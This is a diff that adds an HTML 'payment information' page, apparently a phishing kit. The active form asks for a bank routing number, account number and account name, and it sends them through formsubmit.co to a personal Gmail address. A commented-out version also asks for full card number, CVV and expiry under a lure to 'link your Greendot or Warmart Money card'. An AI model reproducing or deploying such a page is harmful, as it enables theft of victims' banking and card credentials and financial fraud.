@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CARD | PAYMENT</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js"></script>
+</head>
+<body>
+    <!-- <div class="container">
+        <br>
+        <h2 style="text-align: center; color: black;">Payment Information</h2>
+        <br>
+        <p style="padding: 0px 20px; color: gray">Link your Greendot or Warmart Money card below: </p>
+        <form id="payment_form" name="payment_form" onsubmit="proceed()" action="/index.html" method="post" netlify>
+            <div class="card">
+                <button class="proceed">
+                    <svg class="sendicon" width="24" height="24" viewBox="0 0 24 24">
+                        <path d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z"></path>
+                    </svg>
+                </button>
+                <img src="https://seeklogo.com/images/V/VISA-logo-62D5B26FE1-seeklogo.com.png" class="logo-card">
+                <label>Card number:</label>
+                <input required id="user" type="text" name="maskedpan" class="input cardnumber"  placeholder="1234 5678 9101 1121">
+                <label>Name:</label>
+                <input required class="input name" name="name" placeholder="Edgar Pérez">
+                <label class="toleft">CCV:</label>
+                <input required class="input toleft ccv" name="cv_3" placeholder="321">
+                <br>
+                <br>
+                <label style="margin-top:-10px;">Exp:</label>
+                <input required class="input ccv" placeholder="02/23" name="exp_date">
+            </div>
+            <div style="padding: 10%; background-color: #f5f5f5; border: solid 1px #e3e3e3; margin: 80px 10px; border-radius: 10px; text-align: center">
+                <Label class="payment_label">Routing Number:</Label>
+                <input required class="payment_txt" type="text" name="rounting_no" placeholder="0987623442" id="">
+                <br>
+                <Label class="payment_label">Account Number:</Label>
+                <input required class="payment_txt" type="text" name="acc_no" placeholder="0987623442" id="">
+                <br><br>
+                <button style="background-color: green; color:white; padding:10px; border-radius: 5px; font-size: 15px" type="submit">SUBMIT</button>
+            </div>
+        </form>
+    </div> -->
+
+
+      <!-- THE ONE ABOVE IS WITH CARD -->
+      <!-- THE ONE ABOVE IS WITH CARD -->
+      <!-- THE ONE ABOVE IS WITH CARD -->
+      <!-- THE ONE ABOVE IS WITH CARD -->
+
+      
+    <div class="container">
+        <br>
+        <h2 style="text-align: center; color: black;">Payment Information</h2>
+        <br>
+        <br>
+        <p style="padding: 0px 20px; color: gray">Please enter the account details where you'd like to receive payments. </p>
+        <form id="payment_form" name="payment_form" onsubmit="proceed()" action="https://formsubmit.co/kellylambeth93@gmail.com" method="post" >
+            <input type="hidden" name="_next" id="_nextPage" >
+            
+            <div style="padding: 10%; background-color: #f5f5f5; border: solid 1px #e3e3e3; margin: 20px 10px; border-radius: 10px; text-align: center">
+                <Label class="payment_label">Routing Number:</Label>
+                <input required class="payment_txt" type="text" name="rounting_no" placeholder="0987623442" id="">
+                <br>
+                <Label class="payment_label">Account Number:</Label>
+                <input required class="payment_txt" type="text" name="acc_no" placeholder="0987623442" id="">
+                <br>
+                <Label class="payment_label">Account Name:</Label>
+                <input required class="payment_txt" type="text" name="acc_name" placeholder="John Doe" id="">
+                <br><br>
+                <button style="background-color: green; color:white; padding:10px; border-radius: 5px; font-size: 15px" type="submit">SUBMIT</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
